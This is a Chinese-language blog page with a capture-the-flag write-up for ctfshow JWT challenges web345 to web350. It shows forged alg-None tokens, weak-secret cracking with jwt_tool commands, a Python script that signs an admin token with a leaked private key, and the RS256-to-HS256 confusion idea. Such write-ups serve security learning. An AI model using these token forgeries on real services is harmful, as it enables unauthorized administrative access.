@@ -1,0 +1,366 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="##web345 题目提示admin 看cookie有一个JWT eyJhbGciOiJOb25lIiwidHlwIjoiand0In0.W3siaXNzIjoiYWRtaW4iLCJpYXQiOjE3NDc4OTc5OTEsImV4cCI6MTc0NzkwNTE5MSwibmJmIjoxNzQ3ODk3OTkxLCJzdWIiOiJ1c2VyIiwianRpIjoiZTYxYzdkYWZjOGZ">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTFSHOW-JWT专题">
+<meta property="og:url" content="http://example.com/2025/05/22/jwt/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="##web345 题目提示admin 看cookie有一个JWT eyJhbGciOiJOb25lIiwidHlwIjoiand0In0.W3siaXNzIjoiYWRtaW4iLCJpYXQiOjE3NDc4OTc5OTEsImV4cCI6MTc0NzkwNTE5MSwibmJmIjoxNzQ3ODk3OTkxLCJzdWIiOiJ1c2VyIiwianRpIjoiZTYxYzdkYWZjOGZ">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/image-20250522154444695.png">
+<meta property="og:image" content="http://example.com/images/image-20250522154245971.png">
+<meta property="og:image" content="http://example.com/images/image-20250522155612353.png">
+<meta property="og:image" content="http://example.com/images/image-20250522155630472.png">
+<meta property="og:image" content="http://example.com/images/image-20250522155708788.png">
+<meta property="og:image" content="http://example.com/images/image-20250522163207633.png">
+<meta property="og:image" content="http://example.com/images/image-20250522164232774.png">
+<meta property="og:image" content="http://example.com/images/image-20250522165108303.png">
+<meta property="article:published_time" content="2025-05-22T07:11:29.000Z">
+<meta property="article:modified_time" content="2025-05-22T08:54:56.256Z">
+<meta property="article:author" content="xin">
+<meta property="article:tag" content="JWT">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/image-20250522154444695.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>CTFSHOW-JWT专题</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/05/20/2/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/05/22/jwt/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/05/22/jwt/&text=CTFSHOW-JWT专题"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/05/22/jwt/&title=CTFSHOW-JWT专题"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/05/22/jwt/&is_video=false&description=CTFSHOW-JWT专题"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=CTFSHOW-JWT专题&body=Check out this article: http://example.com/2025/05/22/jwt/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/05/22/jwt/&title=CTFSHOW-JWT专题"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/05/22/jwt/&title=CTFSHOW-JWT专题"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/05/22/jwt/&title=CTFSHOW-JWT专题"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/05/22/jwt/&title=CTFSHOW-JWT专题"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/05/22/jwt/&name=CTFSHOW-JWT专题&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/05/22/jwt/&t=CTFSHOW-JWT专题"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web346"><span class="toc-number">1.</span> <span class="toc-text">web346</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JWT%E5%B7%A5%E5%85%B7%E4%BB%8B%E7%BB%8D"><span class="toc-number">2.</span> <span class="toc-text">JWT工具介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web347"><span class="toc-number">3.</span> <span class="toc-text">web347</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web348"><span class="toc-number">4.</span> <span class="toc-text">web348</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web349"><span class="toc-number">5.</span> <span class="toc-text">web349</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web350"><span class="toc-number">6.</span> <span class="toc-text">web350</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        CTFSHOW-JWT专题
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">xin</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-05-22T07:11:29.000Z" class="dt-published" itemprop="datePublished">2025-05-22</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/JWT/" rel="tag">JWT</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>##web345</p>
+<p>题目提示admin</p>
+<p>看cookie有一个JWT</p>
+<p><code>eyJhbGciOiJOb25lIiwidHlwIjoiand0In0.W3siaXNzIjoiYWRtaW4iLCJpYXQiOjE3NDc4OTc5OTEsImV4cCI6MTc0NzkwNTE5MSwibmJmIjoxNzQ3ODk3OTkxLCJzdWIiOiJ1c2VyIiwianRpIjoiZTYxYzdkYWZjOGZiNDFjNWUwYjg4Y2MxZDE1Nzk4YmQifV0</code></p>
+<p>解析之后是：<br><code>&#123;&quot;alg&quot;:&quot;None&quot;,&quot;typ&quot;:&quot;jwt&quot;&#125;.[&#123;&quot;iss&quot;:&quot;admin&quot;,&quot;iat&quot;:1747897991,&quot;exp&quot;:1747905191,&quot;nbf&quot;:1747897991,&quot;sub&quot;:&quot;admin&quot;,&quot;jti&quot;:&quot;e61c7dafc8fb41c5e0b88cc1d15798bd&quot;&#125;]</code></p>
+<p>这里没有签名部分所以只需要改<code>sub</code>部分为<code>admin</code>再经过一个base64编码就可以</p>
+<p><code>eyJhbGciOiJOb25lIiwidHlwIjoiand0In0uW3siaXNzIjoiYWRtaW4iLCJpYXQiOjE3NDc4OTc5OTEsImV4cCI6MTc0NzkwNTE5MSwibmJmIjoxNzQ3ODk3OTkxLCJzdWIiOiJhZG1pbiIsImp0aSI6ImU2MWM3ZGFmYzhmYjQxYzVlMGI4OGNjMWQxNTc5OGJkIn1d</code></p>
+<p>然后再去访问<code>/admin/</code>目录即可</p>
+<h2 id="web346"><a href="#web346" class="headerlink" title="web346"></a>web346</h2><p>有加密算法，使用jwt_tool爆破密钥<code>123456</code></p>
+<p><img src="/../images/image-20250522154444695.png" alt="image-20250522154444695"></p>
+<p>修改sub为admin 然后访问<code>/admin/</code>目录</p>
+<h2 id="JWT工具介绍"><a href="#JWT工具介绍" class="headerlink" title="JWT工具介绍"></a>JWT工具介绍</h2><p>使用方法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 使用None算法</span><br><span class="line">python3 jwt_tool.py JWT_HERE ``-``X a</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 自定义修改生成</span><br><span class="line">python3 jwt_tool.py JWT_HERE ``-``T</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 使用字典破解</span><br><span class="line">python3 jwt_tool.py JWT_HERE ``-``C ``-``d dictionary.txt</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 指定密码测试</span></span><br><span class="line">python3 jwt_tool.py JWT_HERE ``-``C ``-``p password_here</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20250522154245971.png" alt="image-20250522154245971"></p>
+<p>爆破出正确密钥</p>
+<p>自定义修改内容</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 jwt_tool.py JWT_HERE -T</span><br></pre></td></tr></table></figure>
+
+<p>eg:<br><img src="/../images/image-20250522155612353.png" alt="image-20250522155612353"></p>
+<p><img src="/../images/image-20250522155630472.png" alt="image-20250522155630472"></p>
+<p>再选择要修改的部分就行了</p>
+<p><img src="/../images/image-20250522155708788.png" alt="image-20250522155708788"></p>
+<p>最后就会生成jwt token</p>
+<h2 id="web347"><a href="#web347" class="headerlink" title="web347"></a>web347</h2><p>爆破密钥123456</p>
+<h2 id="web348"><a href="#web348" class="headerlink" title="web348"></a>web348</h2><p><img src="/../images/image-20250522163207633.png" alt="image-20250522163207633"></p>
+<p>爆破出密钥<code>aabb</code></p>
+<h2 id="web349"><a href="#web349" class="headerlink" title="web349"></a>web349</h2><p><img src="/../images/image-20250522164232774.png" alt="image-20250522164232774"></p>
+<p>源码泄露，可以看到公钥和私钥被放在了web目录，直接访问<code>/public.key</code>和<code>/private.key</code>下载</p>
+<p>公钥用来解密，私钥用来加密，所以编写脚本使用私钥加密</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line">public = <span class="built_in">open</span>(<span class="string">&#x27;private.key&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line">payload=&#123;<span class="string">&quot;user&quot;</span>:<span class="string">&quot;admin&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(jwt.encode(payload, key=public, algorithm=<span class="string">&#x27;RS256&#x27;</span>))</span><br></pre></td></tr></table></figure>
+
+<p><code>eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.NoE2xAUmDyHc0rhNtNtUn8URhEZeFGy9M0hd7hBEfRD3jpGqetn0nj2Tm9mob9LWyl2BazTLm_1Ez1vn0A6ZxgcpF73B6_rE4zrDvyu3b6eH3FtwmKd9I6N0KzkO1IpTggRVy6l4RoQCoG4JJ6X9YVJgOWtm0vgWzcjjXejlEsM</code></p>
+<p><img src="/../images/image-20250522165108303.png" alt="image-20250522165108303"></p>
+<h2 id="web350"><a href="#web350" class="headerlink" title="web350"></a>web350</h2><p>下载源码，只有公钥没有私钥，那就把加密算法改为对称加密算法</p>
+<p>将RS256算法改为HS256（非对称密码算法&#x3D;&gt;对称密码算法）</p>
+<p>HS256算法使用密钥为所有消息进行签名和验证。</p>
+<p>而RS256算法则使用私钥对消息进行签名并使用公钥进行身份验证。</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/tags/">tags</a></li>
+        
+          <li><a href="/categories/">categories</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web346"><span class="toc-number">1.</span> <span class="toc-text">web346</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JWT%E5%B7%A5%E5%85%B7%E4%BB%8B%E7%BB%8D"><span class="toc-number">2.</span> <span class="toc-text">JWT工具介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web347"><span class="toc-number">3.</span> <span class="toc-text">web347</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web348"><span class="toc-number">4.</span> <span class="toc-text">web348</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web349"><span class="toc-number">5.</span> <span class="toc-text">web349</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web350"><span class="toc-number">6.</span> <span class="toc-text">web350</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/05/22/jwt/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/05/22/jwt/&text=CTFSHOW-JWT专题"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/05/22/jwt/&title=CTFSHOW-JWT专题"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/05/22/jwt/&is_video=false&description=CTFSHOW-JWT专题"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=CTFSHOW-JWT专题&body=Check out this article: http://example.com/2025/05/22/jwt/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/05/22/jwt/&title=CTFSHOW-JWT专题"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/05/22/jwt/&title=CTFSHOW-JWT专题"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/05/22/jwt/&title=CTFSHOW-JWT专题"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/05/22/jwt/&title=CTFSHOW-JWT专题"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/05/22/jwt/&name=CTFSHOW-JWT专题&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/05/22/jwt/&t=CTFSHOW-JWT专题"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    xin
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
